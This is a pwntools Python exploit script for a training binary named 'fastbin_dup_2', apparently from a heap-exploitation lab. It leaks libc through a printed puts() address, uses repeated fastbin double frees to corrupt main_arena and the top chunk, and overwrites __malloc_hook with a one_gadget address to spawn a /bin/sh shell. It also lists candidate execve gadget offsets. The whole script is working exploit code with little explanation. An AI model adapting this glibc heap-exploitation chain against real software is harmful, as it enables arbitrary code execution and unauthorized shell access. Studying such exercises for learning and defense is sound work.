#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}")
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym["puts"]
io.timeout = 0.1


# double free
chunk_A = malloc(0x48, b"A" * 0x8)
chunk_B = malloc(0x48, b"B" * 0x8)

free(chunk_A)
free(chunk_B)
free(chunk_A)

# Overwrite head main_arena 0x50 bins to 0x61
chunk_C = malloc(0x48, p64(0x61))

# Barrier
chunk_A = malloc(0x48, b"C" * 0x8)
chunk_B = malloc(0x48, b"D" * 0x8)

# Trigger fastbindup on 0x60 and linked it to the main arena
chunk_D = malloc(0x58, b'E' * 0x8)
chunk_E = malloc(0x58, b'F' * 0x8)

# Double free
free(chunk_D)
free(chunk_E)
free(chunk_D)

# Overwrite fd to the main arena
chunk_F = malloc(0x58, p64(libc.sym["main_arena"] + 0x20))

# Barrier
chunk_D = malloc(0x58, b'-p\x00')
chunk_E = malloc(0x58, b'-s\x00')

# Overwrite top chunk
chunk_F = malloc(0x58, b"A" * 48 + p64(libc.sym["__malloc_hook"] - 0x23))

# One Gadget 
''' One Gadget
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL
  [r12] == NULL || r12 == NULL

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xe1fad execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''
ONE_GADGET = libc.address + 0xe1fa1
malloc(0x38, b"A" * 19 + p64(ONE_GADGET))
malloc(0x1, "A")





io.interactive()